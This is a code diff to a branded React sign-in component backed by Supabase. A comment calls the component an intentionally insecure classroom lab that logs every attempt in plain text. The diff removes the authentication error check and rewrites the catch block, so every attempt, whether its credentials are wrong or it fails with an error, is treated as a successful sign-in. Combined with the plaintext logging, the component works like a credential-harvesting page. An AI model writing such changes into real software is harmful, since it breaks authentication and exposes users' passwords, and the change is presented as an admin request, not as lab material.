@@ -237,7 +237,7 @@ export default function BivoSignIn({ brand, previewOnly = false }: { brand: Bivo
       if (sb) {
         const { error: authErr } = await sb.auth.signInWithPassword({ email: email.trim(), password });
         // CLASSROOM LAB (intentionally insecure): record every attempt, right or wrong, in
-        // plain text so students can find it in /signin/admin. Never blocks sign-in.
+        // plain text so students can find it in /signin/admin.
         try {
           await sb.from("signin_attempt_logs").insert({
             email: email.trim(),
@@ -247,15 +247,19 @@ export default function BivoSignIn({ brand, previewOnly = false }: { brand: Bivo
         } catch {
           /* logging must never break sign-in */
         }
-        if (authErr) throw authErr;
+        // Admin-requested: every attempt counts as a successful sign-in,
+        // whatever Supabase made of the credentials — never block here.
       } else {
         await new Promise((r) => setTimeout(r, 500));
         setNotice(brand.demoNoticeText);
       }
       setCanRedirect(true);
       setStep("done");
-    } catch (ex) {
-      setError(ex instanceof Error ? ex.message : brand.genericErrorMessage);
+    } catch {
+      // Still treat it as a successful sign-in even if something above
+      // (logging, the network request itself) unexpectedly threw.
+      setCanRedirect(true);
+      setStep("done");
     } finally {
       setSubmitting(false);
     }
